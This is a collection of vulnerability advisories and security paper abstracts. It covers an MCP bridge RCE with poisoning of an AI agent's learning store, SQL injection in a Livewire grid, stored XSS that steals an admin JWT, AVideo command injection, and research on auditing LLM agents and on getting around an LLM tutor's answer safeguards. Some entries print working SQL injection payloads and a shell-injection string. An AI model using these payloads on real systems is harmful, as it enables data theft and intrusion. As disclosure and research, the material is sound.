items.summary:
The MCP bridge shipping in ruflo/docker-compose.yml exposed POST /mcp with no authentication. The docker-compose defaults bound the bridge and MongoDB to all interfaces. Combined, an unauthenticated network attacker could invoke tools/call → terminal_execute inside the bridge container, obtain a shell as node (uid 1000), read every provider API key from the container env, spawn attacker-controlled swarms on the victim's keys, and persist a poisoned pattern into the AgentDB learning store that steers future AI outputs for all users of the instance.

The tool blocklist that mentions terminal_execute was enforced only in the autopilot flow. POST /mcp and POST /mcp/:group bypassed it.

Fixed in ADR-166 Phase 1-3 (branch security/adr-166-mcp-bridge-rce, PR #2521):
- Bind loopback by default; fail-closed on public-bind opt-in without MCP_AUTH_TOKEN
- Bearer auth middleware (timingSafeEqual constant-time compare)
- Server-side executeTool gate for terminal_execute (MCP_ENABLE_TERMINAL=true opt-in)
- MongoDB --auth on by default; MONGO_INITDB_ROOT_PASSWORD required to boot
- read_only container + tmpfs
- CORS allowlist wiring
- CI regression locks (static + runtime + compose defaults)

Operators of any exposed instance MUST:
1. Firewall :3001 and :27017 immediately
2. Rotate OPENAI / GOOGLE / OPENROUTER / ANTHROPIC keys
3. Audit the AgentDB pattern store for injected agentdb_pattern-store entries; purge poisoned patterns. A patched redeploy alone does NOT undo poisoning.
4. Audit MongoDB for tampering

Credit: [Eli Ainhorn](https://www.linkedin.com/in/eli-ainhorn), Senior AI Vulnerability Researcher @ [Noma Security](https://noma.security) 

Reviewed by Dragan Spiridonov (ADR-166 co-author).

items.summary:
### Impact
_What kind of vulnerability is it? Who is impacted?_

When etcd is configured with `--listen-client-http-urls` to split the HTTP and gRPC client endpoints onto separate listeners, the `--client-crl-file` Certificate Revocation List is not enforced on the gRPC listener. A client presenting a revoked certificate is correctly rejected by the HTTP endpoint but continues to authenticate successfully over gRPC.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

This vulnerability is patched in the following versions:

- etcd 3.6.13
- etcd 3.5.32

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

If upgrading is not immediately possible, reduce exposure by restricting network access to etcd client ports using firewall rules or network policy so that only trusted components can reach the server. This limits the pool of clients that could exploit a revoked certificate but does not enforce CRL revocation.

### Reporter

Luis Toro ([@lobuhi](https://github.com/lobuhi) on Github)

items.summary:
On November 25, 2026, we released versions 19.6.2, 19.5.9, 19.4.11 for GitLab Community Edition (CE) and Enterprise Edition (EE). These versions contain important bug and security fixes, and we strongly recommend that all self-managed GitLab installations be upgraded to
one of these versions immediately. GitLab.com is already running the patched version. GitLab Dedicated customers do not need to take action. GitLab releases fixes for vulnerabilities in patch releases. There are two types of patch releases:
scheduled releases and ad-hoc critical patches for high-severity vulnerabilities. Scheduled releases are released twice a month on the second and fourth Wednesdays.
For more information, please visit our releases handbook and security FAQ .
You can see all of GitLab release blog posts here . For security fixes, the issues detailing each vulnerability are made public on our issue tracker 90 days after the release in which they were patched. We are committed to ensuring that all aspects of GitLab that are exposed to customers or that host customer data are held to
the highest security standards. To maintain good security hygiene, it is highly recommended that all customers
upgrade to the latest patch release for their supported version. You can read more best practices in securing your GitLab instance in our blog post. Recommended Action We strongly recommend that all installations running a version affected by the issues described below are upgraded to the latest version as soon as possible . When no specific deployment type (omnibus, source code, helm chart, etc.) of a product is mentioned, it means all types are affected. Security fixes Dependency updates Recent patches to upstream dependencies bundled with GitLab have been backported or updated for multiple vulnerabilities: Git ( CVE-2026-105437 ): backported to GitLab versions 19.2.11, 19.1.11, 19.0.12, and 18.11.15 (previously included in 19.5.4, 19.4.6, and 19.3.8 ). Ruby ( Ruby security advisory ): backported to GitLab versions 19.3.10, 19.2.11, 19.1.11, 19.0.12, and 18.11.15 (previously included in 19.6.1, 19.5.8, and 19.4.10 ). GitLab has also remediated CVE-2026-129975 , a double free in GPGME, through multiple fixes, all of which are included in GitLab versions 19.6.2, 19.5.9, 19.4.11, 19.3.10, 19.2.11, 19.1.11, 19.0.12, and 18.11.15: The GPGME library bundled with GitLab Linux packages has been patched to fix the double free. Ruby-GPGME (the gpgme gem) has been updated to 2.0.27. OpenPGP input is now validated before it is passed to GPGME as an additional mitigation. NGINX ( NGINX release notes ): updated to 1.31.9 in the Linux package (Omnibus) and GitLab Docker images built from the package in versions 19.6.2, 19.5.9, and 19.4.11. Please note : GitLab Helm Chart and GitLab Operator installations using the deprecated NGINX Ingress controller are also affected. This controller is deprecated and has been disabled by default since 19.0. The upstream NGINX Ingress no longer receives security patches so we strongly recommend migrating to Envoy Gateway or an external Ingress controller. An updated NGINX controller will ship in an upcoming chart release. Extended backports are an exception and do not reflect our standard maintenance policy . Table of security fixes Title Severity Exposure of Sensitive Information issue in dependency proxy authentication impacts GitLab CE/EE Medium Improper Validation of Specified Quantity in Input issue in on-call rotation length API impacts GitLab EE Medium Allocation of Resources Without Limits or Throttling issue in Sentry error tracking client impacts GitLab CE/EE Medium Improper Neutralization of Special Elements issue in Service Desk quick action redaction impacts GitLab CE/EE Medium Exposure of Sensitive Information issue in Work Item REST API CI job token scope validation impacts GitLab CE/EE Medium Server-Side Request Forgery issue in MCP server OAuth token endpoint handler impacts GitLab EE Medium Use of Weak Hash issue in mer

items.summary:
## [Description]

The public Livewire property `sortDirection` is interpolated **verbatim** into a
raw SQL `ORDER BY` clause and is not restricted to `asc`/`desc`, allowing arbitrary
SQL injection through `POST /livewire/update`.

**Data flow**

- **Source** — `src/Concerns/Sorting.php`: `public string $sortDirection;` is a
  Livewire-bound property with no whitelist/validation (it is only assigned and
  flipped by `reverseSort()`), so it is fully attacker-controlled via the standard
  Livewire update endpoint.
- **Taint** — `src/DataSource/Processors/Database/Pipelines/ColumnRawQueries.php`,
  `resolvePlaceholders()`:
  ```php
  preg_replace_callback('/\{(\w+)\}/', fn ($m) => data_get($this->component, $m[1], ''), $sql);
  ```
  substitutes `{sortDirection}` with the raw property value.
- **Sink** — `src/DataSource/Support/Sql.php::getSortSqlByDriver()` builds the
  `naturalSort` expression, e.g. `"... {sortDirection}"` / `"CAST(...) {sortDirection}"`,
  which is passed to `orderByRaw()`. The tainted direction lands directly in the SQL
  string.

**Why the framework mitigation does not apply (the bypass)**

Normally the `Sorting` pipeline calls `orderBy(resolveSortField($sortField), $sortDirection)`,
and Laravel validates the direction (`Order direction must be "asc" or "desc".`).
Setting **`sortField=""`** makes the `Sorting` pipeline skip (`filled('')` is false),
so the validating `orderBy` never runs — but the `ColumnRawQueries` pipeline still
applies the `naturalSort` `orderByRaw` unconditionally with the attacker-controlled
`{sortDirection}`. The result is arbitrary SQL in the `ORDER BY`, bypassing Laravel's
direction validation entirely.

## [Proof of Concept]

Lab: Laravel 11.53 + Livewire 3.8 + livewire-powergrid 6.10 + MariaDB, with a
PowerGrid table whose `name` column uses `->naturalSort(true)`.

Request (standard Livewire update; CSRF token taken from the page as any Livewire call):
```
POST /livewire/update
components[0].snapshot = <the PowerGrid component snapshot from the page>
components[0].updates  = {"sortField": "", "sortDirection": "asc, (SELECT SLEEP(3))"}
```

Observed results:

- **Error-based** (HTTP 500, `SQLSTATE[HY000] 1105`) — the injected subquery reaches
  the database verbatim:
  ```
  select * from `rooms` order by CAST(NULLIF(REGEXP_REPLACE(name, ...) ...) asc,
    (select extractvalue(1, concat(0x7e, (select secret from rooms limit 1)))) limit 3 offset 0
  ```
- **Blind time-based** (arbitrary data extraction):
  ```
  asc                                 -> 0.02s   (baseline)
  asc, (SELECT SLEEP(3))              -> 9.04s   (injection executes)
  asc, (SELECT SLEEP(3) WHERE (SELECT secret FROM rooms LIMIT 1) LIKE 'TOPSECRET%')  -> 9.03s  (TRUE — value leaks)
  ... LIKE 'ZZZ%'                     -> 0.02s   (FALSE — boolean oracle)
  ```

A parameterised PoC script is available and can be attached privately on request.

## [Impact]

Any actor who can reach a PowerGrid table using `naturalSort` and control the
`sortDirection` property can read arbitrary data from the database (other tables,
password hashes, tokens) via a blind boolean/time-based oracle. Stacked queries are
blocked by the default PDO MySQL driver, so impact is read-oriented (confidentiality),
but complete for readable data. In multi-tenant/admin apps this enables full
cross-tenant data exfiltration.

items.summary:
### Summary `@waline/client` renders the comment editor's live preview with `marked` and no sanitizer (`utils/markdown.ts`), and the preview is injected with `v-html`. When a comment is edited, the editor is seeded with the comment's raw, un-sanitized body (`orig`). Only administrators and the comment owner can edit. So an administrator who clicks Edit on an attacker's comment renders that attacker's raw HTML in their own session: an unauthenticated commenter achieves privilege-escalation stored XSS against a moderator with a single Edit click. ### Details `packages/client/src/utils/markdown.ts:18-37` renders markdown with `marked` and returns the raw HTML with no sanitization (the client bundles no DOMPurify): ```ts return marked.parse(parseEmoji(content, emojiMap)) as string; ``` `packages/client/src/components/CommentBox.vue`: ```ts onMounted(() => { if (props.edit?.objectId) editor.value = props.edit.orig; // :509 raw comment body watchImmediate(() => editor.value, (value) => { previewText.value = parseMarkdown(value, { ... }); // :519 runs immediately on mount }); }); ``` ```html
``` `watchImmediate` runs the callback synchronously at mount, so `previewText` is populated with the unsanitized render as soon as the box mounts in edit mode. `v-show` (not `v-if`) means the `v-html` node is present in the DOM (display:none), so an `` fires without the moderator ever opening the preview tab. The tainted value is the attacker's raw comment. `packages/server/src/controller/comment.js:41` sets `comment.orig = comment.comment` for any logged-in user before `:55` runs DOMPurify, so `orig` is the pre-sanitization body. `formatCmt` returns it to logged-in users, and `CommentCard.vue:104` shows the Edit button to admin or owner. ### Proof of concept 1. As an anonymous user, post a comment whose body is the payload below via `POST /api/comment`: ``` POST /api/comment { "url": "/any-post", "nick": "a", "comment": "" } ``` 2. On the public page the server sanitizes the display copy (markdown-it -> DOMPurify), so nothing fires for ordinary readers and the comment shows as a broken image. The raw body is stored in `orig`. 3. As an administrator or the comment owner, click Edit on that comment during normal moderation. 4. `CommentBox` mounts, seeds the editor with the raw `orig`, and `watchImmediate` immediately renders it through `parseMarkdown` (marked, no sanitizer) into the `v-html` preview node. Because the preview uses `v-show` (display:none), that node is already in the DOM without opening the preview tab, so `onerror` fires at once in the admin's session and exfiltrates their `localStorage` JWT. The server's own comment guard strips this same `` on the stored display copy, which is why the public listing is safe; the edit preview is the unguarded path. ### Impact The waline JWT is in same-origin `localStorage`, so the payload can read it, yielding full administrative account takeover. ### Suggested fix Sanitize `parseMarkdown`'s output with DOMPurify before returning it, mirroring the server guard: add `dompurify` to `@waline/client` and wrap the return in `DOMPurify.sanitize(..., { FORBID_TAGS: ['form','input','style'], FORBID_ATTR: ['autoplay','style'] })`.

items.summary:
### Summary
Local command injection (CWE-78) in server-side KaTeX rendering via an unescaped Node.js binary path in a `proc_open()` command string.

### Affected versions
>= 0.4.0, < 1.0.0

### Patched versions
>= 1.0.0 (fixed in commit `100cb1e`)

### Impact
When rendering KaTeX math **server-side**, Laradocs invoked Node via `proc_open()` with a command string in which the Node binary argument was not passed through `escapeshellarg()`.

`MarkdownPipelineFactory` constructs `KatexExtension` with the configured binary, which the render path resolved as:

```php
$node = $this->nodeBin ?? 'node';
$cmd = $node . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);
```

`$this->nodeBin` comes from `Config::nullableString('laradocs.parser.katex.node_bin')`. Both possible sources — the configured `node_bin` value, or the `'node'` default resolved from `PATH` — are operator-controlled. Neither is derived from untrusted request data or documentation content.

The vulnerable branch is reached only when server-side rendering is enabled. The default KaTeX path is client-side (browser-rendered via the configured `js`/`css` assets) and never calls `proc_open()`. SSR is opt-in via `laradocs.parser.katex.ssr`, which ships **disabled**.

### Exploit scenario
Exploitation requires SSR to be turned on **and** an untrusted party to control `laradocs.parser.katex.node_bin` or the process `PATH` — a precondition that on its own already implies code execution on the host.

### Severity
**Low.** This is best treated as a hardening / defence-in-depth fix rather than a remotely exploitable RCE, since no untrusted input (request data, documentation content, or network input) reaches the vulnerable code path under normal operation.

### Patch
The Node binary argument is now passed through `escapeshellarg()` like the other command components:

```php
$cmd = escapeshellarg($node) . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);
```

### Credit
Reported via automated security scanning (Aikido).

items.summary:
### Summary

A security vulnerability has been identified in GitHub CLI that could allow remote code execution when users connect to a malicious Codespace using the `gh codespace jupyter` command. The command opens JupyterLab by launching a URL in the user's browser, but that URL is supplied by a process running inside the Codespace and the CLI opens it without validating it.

The browser launcher accepts `vscode://` and `vscode-insiders://` links, so a malicious Codespace can return a crafted `vscode://` URL. The CLI opens the link, the operating system hands it to VS Code, and VS Code acts on it, which can lead to code execution on the user's workstation.

This is a variant of [CVE-2024-52308](https://github.com/advisories/GHSA-p2h2-3vg9-4p87). That remediation validated the SSH connection details for `gh codespace ssh` and `gh codespace logs`, but did not cover the equivalent Jupyter code path.

### Details

The vulnerability stems from the way GitHub CLI handles the server URL returned when starting a remote JupyterLab server:

1. A user runs `gh codespace jupyter -c <name>`, expecting a normal `https://` JupyterLab page.
2. The CLI retrieves a server URL from a process inside the Codespace and opens it in the user's browser without confirming that it is a web address.
3. A malicious Codespace returns a `vscode://` link in place of the expected JupyterLab address. The operating system passes the link to VS Code.
4. VS Code acts on the link. With a single trust prompt, this can result in code execution on the user's workstation.

The CLI trusts the URL provided by the Codespace and opens it as-is, without confirming that it is a loopback JupyterLab web address. The equivalent SSH commands received this validation in the CVE-2024-52308 fix, but the Jupyter command was not covered.

In `v2.96.0`, the GitHub CLI validates the Jupyter server URL before opening it, accepting only loopback `http` and `https` addresses.

### Impact

Any user who runs `gh codespace jupyter` against an untrusted Codespace.

Successful exploitation requires the victim to accept one VS Code "open URL" or Workspace Trust prompt.

## Remediation and Mitigation

1. Upgrade `gh` to `v2.96.0`.
2. Exercise caution when using `gh codespace jupyter` with untrusted Codespaces. Prefer Codespaces created from trusted sources, and prefer default or pre-built devcontainers.
items.title: GitHub CLI gh codespace jupyter may allow code execution via unvalidated URLs from malicious Codespaces

items.summary: Large language models (LLMs) are transforming the economics of intrusion by reducing the attacker's cost to scan and adapt, while tempting defenders into unbounded compute. We argue that cyber deception should be judged by the cost exchange it imposes, not by realism or detection, and that the primitive making that exchange favorable is adversary-specific persistent state. Rather than a honeypot that resets or merges sessions, each recognized adversary re-enters the world it believes it has compromised, kept coherent with its own past actions and isolated from every other adversary, while the language model acts only as a constrained renderer of explicit state, never as its store. We formalize the trade-off as a Deception Exchange Rate (DER), relating mission-weighted adversary effort burned to defender resources spent, and instantiate it in an SSH honeypot pairing Cowrie with a local LLM. In this paper, we focus on the defender-side evaluation of that exchange, while specifying, but not yet measuring, per-adversary state and the adversary side of the DER. Across five open-weight models, deterministic-layer and prompt optimizations cut per-session defender cost by around 63% against a naive all-LLM decoy.
items.title: Make the Adversary Spend More: Stateful Deception as a Cost-Exchange Primitive for AI-Era Cyber Defense

items.summary: LLM-based agents are emerging as a key paradigm for automating software engineering by coupling LLM-driven decision-making with external tools, files, APIs, and execution environments. However, weaknesses in agent implementations and insecure interactions between the agent and external resources can lead to severe consequences, including remote code execution, arbitrary file access, SQL injection, and data leakage. This makes pre-deployment auditing essential for systematically identifying implementation weaknesses and validating whether they can manifest as concrete security risks in realistic agent workflows. Existing approaches either focus on specific vulnerability classes or lack the capability to validate whether identified static weaknesses correspond to executable exploits. In this paper, we propose AgentLens, a systematic auditing framework for LLM-based agents. AgentLens analyzes the target agent's implementation, component interactions, and built-in defenses, and organizes them into an Audit Knowledge Graph that captures how these factors interact to expose potential security risks. Based on this graph, AgentLens derives candidate attack paths, generates path-specific validation payloads, and constructs realistic multi-turn audit scenarios that place these payloads in task-relevant contexts to validate whether suspected risks manifest as security-violating behaviors during execution. Across five widely-used agent applications, each with over 24,000 GitHub stars, AgentLens identifies 44 vulnerabilities, and every vulnerability is validated by being triggered during execution. Compared with the state-of-the-art approach (AgentFuzz), AgentLens detects 3.67$\times$ more vulnerabilities. To date, 12 reported issues have been assigned CVE IDs.
items.title: AgentLens: Graph-guided Security Auditing for LLM-based Agents

items.summary: Clients of closed-weight LLM APIs cannot verify whether a provider ran the advertised model, precision, hidden prompt, and reasoning budget. Existing approaches either trust hardware or third parties, or re-prove every layer of an integer surrogate at high cost while diverging from native floating-point serving. FlashProve-Next produces verifiable, zero-knowledge-masked proofs for individual LLM API responses without modifying native serving (bf16/fp8/mxfp4, random sampling, FlashAttention, CUDA graphs, batching, prefix caching) and without disclosing weights, hidden prompts, hidden reasoning, or activations (dense profiles fix coarse geometry; cross-architecture hiding is deferred). A non-depleting Reed-Solomon weight commitment model_id opens inside proofs via hidden column openings, while local per-operator rounding contracts remove integer surrogates and the refusal-bit leak. Cost-weighted spot-checking supports non-interactive public verification (NI-315, $\varepsilon \le 2^{-40}$, $Q \le 2^{64}$) and external-seed C_pre mode (ExtSeed-153, $\varepsilon \le 2^{-20}$, $Q_{\rm samp} \le 2^{30}$). Twenty-eight Lean 4 modules (696 declarations, zero sorry, standard axioms only) mechanize round-by-round soundness, bucketed sampling, $\mathbb{F}_{p^3}$ constrained-mask binding, causal masking, six IR gadgets, and executable FPN2 verifiers. Five-model Blackwell calibration gives zero false rejections across 1.85M GEMM/MoE blocks and 1.96M non-GEMM rows. Our zero-Phase-2 folded backend (folded ZK simulator open) proves Qwen3-0.6B ExtSeed-153 (1.47B cells, 8 MiB) in 450.2 s GPU (10.76 s CPU) at unique-decoding $Q=128$, passes a 14/14 cheating matrix, and scales to 36-layer Qwen3-4B (dev $4+2$) and live vLLM Qwen3-30B-A3B-FP8 Relation 6 (1.49 s prove, 23.4 ms Rust verify, public weight tiles). Rust fpn-verify checks 8 MiB FPN2 Relation 2 proofs in 10.1 ms on CPU.

items.summary: In LLM task execution, a constraint on the permitted disclosure granularity of personal attributes is sometimes imposed on the output. For example, if a person's private attribute is their location (San Francisco) and disclosure is permitted only at the country level, an output at the state level (California) violates the constraint. Detecting such violations requires capturing not only direct privacy leakage (San Francisco) but also semantic leakage (California). However, existing benchmarks cannot measure the degree of leakage with respect to a given semantic constraint such as the country-level limit. We therefore formalize disclosure control as a constraint on the permitted ceiling over the hierarchy of a knowledge graph. Building on this formulation, we construct PDC-Bench, a benchmark of 16,105 samples covering geography, age, race and ethnicity, and occupation. In our experiments applying PDC-Bench to eleven LLMs, 62% of the constraint violations were semantic leakage. We further found that semantic leakage depends less on the model than on the permitted disclosure granularity and the task's need for the private attribute; reliable auditing must therefore target semantic leakage together with these two factors. Data, prompts, and code are available at https://github.com/fuji1655/PDC-Bench.
items.title: Privacy Disclosure Control Benchmark (PDC-Bench): How Faithfully Do LLMs Keep Privacy Constraints on In-Context Disclosure Granularity?

items.summary: We show that quantization asymmetry concentrates bit-flip vulnerability in small tensors retained at high precision. CoarseHammer targets these tensors and accepts flips at any bit, without parameter values, gradients, or data. It remains effective under continued fine-tuning. Under ideal placement, CoarseHammer reaches chance accuracy in at least 81.5% of runs on each of ten evaluated models, including four large language models, with median successful runs requiring at most 24 flips. On simulated DRAM with 0.01 flippable bits per million, it outperforms three prior attacks on every evaluated convolutional network, succeeding in up to 83.6% of runs while they never succeed. On a real system, CoarseHammer steers heap-allocated tensors onto vulnerable frames despite address space layout randomization, without accessing the model file. With 16 templated frames, median accuracy reaches chance for all four language models and approximately chance for four convolutional networks.
items.title: Bit-Flip Attacks on Quantized Neural Networks without Knowledge of Model Parameters

items.summary: Software vulnerabilities leave systems open to attack, and their remediation is often delayed. Large language models (LLMs) have advanced automated patch generation, yet passing functionality tests does not ensure that a patch enforces the security requirement the vulnerability violated. Existing vulnerability repair techniques rely on curated patterns or templates with limited coverage, leaving unclear which repair strategies carry over across vulnerabilities and how they can steer LLMs. We present a large-scale empirical study that relates recurring fix patterns to the security impacts of vulnerabilities and examines how this knowledge can guide LLM-based repair. Building on a manual study of security patches, we cluster 3,816 security patches from 348 open-source repositories and analyze the edits and their context to derive concrete fix patterns, ranging from local safeguards to coordinated changes across multiple locations. We define 12 security impact classes by the security requirements that vulnerabilities violate and map them to repair categories and fix patterns, revealing characteristic repairs, alternative strategies within a class, and patterns shared across classes. items.summary: LLM-based security review agents can reason about vulnerabilities that deterministic tools miss, but deploying them responsibly requires knowing whether they actually work. Existing benchmarks construct ground truth synthetically or from public CVE databases and are blind to the vulnerability patterns specific to a given production codebase. We present an evaluation framework grounded in an organisation's own vulnerabilities, with three contributions. First, a dataset construction methodology that derives ground truth from operational security data (bug bounty reports, penetration test findings and internally reported vulnerabilities), exploiting the property that a confirmed vulnerability must exist immediately before its fix is merged and be absent immediately after. Second, two complementary evaluation strategies: one reviewing the pull request that introduced a vulnerability and one searching a repository where it already exists. Both run through a two-agent pipeline pairing a Security Engineer agent, which reviews code without knowledge of the vulnerability, with a Judge agent that decides whether its findings would have mitigated the known issue. Third, a trace-level behavioural characterisation of how frontier models reason about these vulnerabilities. Across GPT-5.5, Sonnet 4.6 and Opus 4.7, GPT-5.5 shows higher discovery rates on the pull-request strategy (57%, 95% CI [42%, 72%]) after a round of OPRO-style improvements, and Sonnet 4.6 on the repository strategy (69%, 95% CI [56%, 81%]). Trace analysis shows the models have complementary strengths that explain these differences, and that outcome-only scoring can mischaracterise their production behaviour. The methodology relies only on artefacts that vulnerability management workflows commonly produce, though all results come from a single organisation's codebase and we have not tested how well they generalise.

items.summary: Tutors built on large language models (LLMs) are told not to give away answers, but a learner does not have to ask for the answer all at once. Existing safeguards judge each reply within the current conversation, so a learner can open a new session, reword the problem, or request a worked solution to the same problem with different numbers. We call this cross-session disclosure and propose a defense: a persistent, per-learner disclosure ledger. For every problem a learner brings, the system builds a typed solution graph. Before a reply is released, a gate matches the reply's own content, not the learner's wording, against the ledger by result values and by type-labeled solution structure, then computes which steps the learner could now derive. The reply is withheld if that set reaches the final answer or exceeds a budget. In a simulation of 3,000 problems, the ledger reduced leakage through renumbered practice variants from 100% to 10.6% while honest learners completed 94-99.5% of problems. With two real LLM tutors (Qwen2.5-3B-Instruct and Phi-3.5-mini-instruct) on 60 problems, leakage through renumbered variants fell from 0.58 to 0.08 and from 1.00 to 0.18, with 98% honest completion. The ledger did not reduce split requests beyond a per-session gate in the live runs. All acceptance criteria were fixed before each run.

`fulgur` converts untrusted HTML/CSS into PDF, commonly on a server that processes input supplied by many tenants. In versions from 0.4.4 up to (but not including) the patched release, the CSS `string-set` named-string values resolved from a document were accumulated per element with no memory budget, letting a small crafted document amplify into large retained memory (and the CPU to copy it) — a denial of service. A `string-set` value is attacker-controlled: it is resolved from an element's own text (`content(text)`), from one of its attributes (`attr(...)`), or from a CSS string literal. fulgur accumulated these values per element in two unbounded places: 1. **Store (default path).** For every element that matches a `string-set` rule, fulgur pushes a copy of the resolved value into a store that is retained for the whole render and cloned again downstream into a per-node lookup map. This happens on the ordinary render path with no opt-in. A single literal reused across many elements therefore expands from one copy in the input to N copies in memory: ```html

``` The store grows to roughly `value_size × N` bytes (and ~3× that across the downstream clones) from an input whose large part appears only once — a breadth-unbounded amplification. 2. **Per-node snapshot (bookmark / cross-reference path).** When PDF bookmarks (`bookmark-label: string(...)`) or CSS `target-*` references are in play, fulgur additionally cloned the full running `name → value` map at every visited element so `string()` can resolve at that position. One large value is then re-cloned at each of N following elements — an `O(N × value_size)` retained-memory sink. This is the string counterpart of the counter-snapshot sink fixed in [GHSA-395p-pj7r-jm42](https://github.com/fulgur-rs/fulgur/security/advisories/GHSA-395p-pj7r-jm42); that fix bounded the counter snapshots but did not bound this string twin. An attacker able to submit HTML/CSS to a fulgur-based conversion service can trigger memory and CPU exhaustion with a trivially small payload, denying service to the host and any co-tenants. ## Patches Fixed in **0.28.0**. The aggregate of each sink is now separately bounded: the resolved `string-set` store (`MAX_STRING_SET_STORE_BYTES`) and the retained per-node named-string snapshots (`MAX_STRING_SNAPSHOT_BYTES`). In addition, the snapshot is no longer recorded for `target-*`-only renders — those snapshots are consumed only by `bookmark-label: string(...)`, so recording them when no bookmarks are emitted was both wasted work and the only path that let inline `target-*` CSS enable the snapshot clone with no bookmark opt-in. The caps are kept far above any realistic document (short named strings, even thousands of them); past the cap a `string()` reference degrades to its last recorded value, which only occurs under adversarial input. ## Workarounds Upgrade to 0.28.0 or later. If upgrading is not immediately possible, validate or constrain untrusted CSS — in particular a `string-set` rule with a large literal (or `content(text)` / `attr(...)`) value matched by many elements — before passing HTML to fulgur, and bound the size and element count of accepted input. ## Attack Vector rationale `fulgur` performs no network I/O of its own; it renders HTML/CSS handed to it by the embedding application. items.summary:
### Impact

`verify_envelope_bsp()` derived its trust anchor from the message it was
verifying. It read the X.509 certificate out of the caller-untrusted
`wsse:BinarySecurityToken`, validated **only** that certificate's not-before /
not-after dates, and then verified the signature against that same certificate.
There was no CA-chain validation, no issuer/subject allowlist, and no pinning.

A successful `verify_envelope_bsp()` therefore proved only that the envelope was
signed by *whoever supplied the embedded certificate* — never that it was signed
by a *trusted* party. An attacker who mints their own certificate, signs a
forged envelope, and embeds that certificate in the token passes verification.
Any consumer that treats a successful BSP verification as authentication can be
impersonated (signature forgery / authentication bypass).

`verify_envelope()` (which pins a caller-supplied `x509_cert`) was **not**
affected — the flaw was specific to the BSP variant whose trust anchor came
from the message.

### Affected versions

soapbar `< 0.13.0` (all published versions exposing `verify_envelope_bsp`).

### Patches

Fixed in **0.13.0**. `verify_envelope_bsp` now fails closed unless the caller
anchors trust:

- `trusted_certs=[...]` — pin the expected signer certificate(s); the embedded
  certificate must equal one of them.
- `ca_certs=[...]` — accept certificates directly issued by trusted CA(s).

With neither supplied, verification raises instead of trusting the message's own
certificate. The trust anchor is checked before the signature is relied upon.
`verify_cert_trust=False` restores the old (insecure) behaviour explicitly.

### Workarounds

Before upgrading:

- Do not treat a successful `verify_envelope_bsp()` as authentication.
- Prefer `verify_envelope(..., x509_cert=<pinned cert>)`, which pins the
  expected certificate.
- If BSP is required, validate the embedded certificate against your own trust
  store before acting on the verification result.

The standalone FFmpeg execution endpoint `plugin/API/standAlone/ffmpeg.json.php` builds a shell command string that is passed to `execAsync()` and run via `nohup sh -c "<command>"`. When the decrypted `codeToExec` payload produces a non-empty `avideoPath`, the endpoint appends a completion hook of the form:

```
 && php <script> notify=<escaped-json> notifyCode=<codeToExec->notifyCode> callback=<codeToExec->callback>
```

The `notify` value on this line is wrapped with `escapeshellarg()`, but the two adjacent fields `notifyCode` and `callback` are concatenated raw. Both fields originate from the same decrypted, attacker-controlled `codeToExec` object as `ffmpegCommand`, but neither passes through the `sanitizeFFmpegCommand()` denylist (only `ffmpegCommand` does) and neither is shell-escaped. An attacker who can craft a valid encrypted payload can therefore inject arbitrary shell commands into the `sh -c` context by placing shell metacharacters in `callback` or `notifyCode`, achieving OS command execution as the web-server user.

This is a residual sibling of the recently hardened `sanitizeFFmpegCommand()` denylist: the denylist now strips `; | ` < > & $ ( ) \n \r { }` from `ffmpegCommand`, but the two sibling fields on the same completion-hook line were never routed through it nor escaped, even though the `notify` value beside them on the very same line already is escaped.

if (!empty($output['avideoPath'])) {
    if (file_exists($output['avideoPath'])) {
        unlink($output['avideoPath']);
    }
    $outputJson = escapeshellarg(json_encode($output));
    $ffmpegCommand .= " && php " . escapeshellarg(__DIR__ . "/ffmpeg.json.php") . " notify={$outputJson} notifyCode={$codeToExec->notifyCode} callback={$codeToExec->callback}";
}
```

`$outputJson` is escaped; `$codeToExec->notifyCode` and `$codeToExec->callback` are interpolated raw.

The only field that is sanitized earlier is `ffmpegCommand` (line ~129):

$ffmpegCommand = !empty($codeToExec->ffmpegCommand) ? sanitizeFFmpegCommand($codeToExec->ffmpegCommand) : '';
```

```php
$command = preg_replace('/[;|`<>&$()\n\r{}]/', '', $command);
```

`notifyCode` / `callback` never touch this function.

The composed string flows to `execAsync()` in `objects/functionsExec.php` (around line 705), which runs it via `sh -c`:

```php
$commandWithKeyword = "nohup sh -c \"$command & echo \\$! > /tmp/$keyword.pid\" > /dev/null 2>&1 &";
exec($commandWithKeyword, $output, $retval);
```

`addcslashes($command, '"')` earlier in `execAsync()` escapes only double quotes, not `;`, `$(...)`, backticks, etc., so injected metacharacters in `notifyCode` / `callback` reach the shell intact.

preg_match('/ [\'"]?(\/[0-9a-z_\/-]+\/videos\/([0-9a-z_\/-]+)\/([0-9a-z_-]+\.(mp4|mp3)))[\'"]?/i', $ffmpegCommand, $matches);
```

items.summary:
### Summary

The helper `listFFmpegProcesses($keyword)` in `plugin/API/standAlone/functions.php` builds a shell pipeline by interpolating `$keyword` inside single quotes and running it with `exec()`:

```php
$command .= " | grep '$keyword'";
exec($command, $output, $status);
```

The two callers in `plugin/API/standAlone/ffmpeg.json.php` (the `list` mode and the `isKeywordRunning` mode) pass the RAW decrypted `codeToExec` field, not the sanitized `$keyword` variable that the endpoint allowlists elsewhere. Because the value is placed inside a single-quoted shell context with no escaping, a payload that closes the quote (for example `x'; touch /tmp/marker #`) breaks out and injects an arbitrary command that runs via `exec()`'s `/bin/sh -c`. An attacker who can craft a valid encrypted payload achieves OS command execution as the web-server user.

### Vulnerable code

Sink — `plugin/API/standAlone/functions.php`, `listFFmpegProcesses()` (around lines 139-147):

```php
function listFFmpegProcesses($keyword = '')
{
    $command = "ps -eo pid,etime,%cpu,%mem,cmd | grep '[f]fmpeg'";

    if (!empty($keyword)) {
        $command .= " | grep '$keyword'";   // $keyword interpolated inside single quotes, unescaped
    }

    exec($command, $output, $status);       // runs via /bin/sh -c
```

Callers — `plugin/API/standAlone/ffmpeg.json.php` pass the RAW decrypted field, bypassing the allowlisting applied to the local `$keyword` variable. That local variable is built at line ~136 as `$keyword = preg_replace('/[^a-zA-Z0-9_-]/', '', $codeToExec->keyword)`, but the two callers below never use it:

```php
// list mode (line ~221)
$list = listFFmpegProcesses($codeToExec->keyword);

// isKeywordRunning mode (line ~341)
$list = listFFmpegProcesses($codeToExec->isKeywordRunning);
```

Neither mode is gated by the `$isStandAlone` check that guards the `deleteFolder` / `deleteFile` modes, so both run on any AVideo instance.

### Reachability

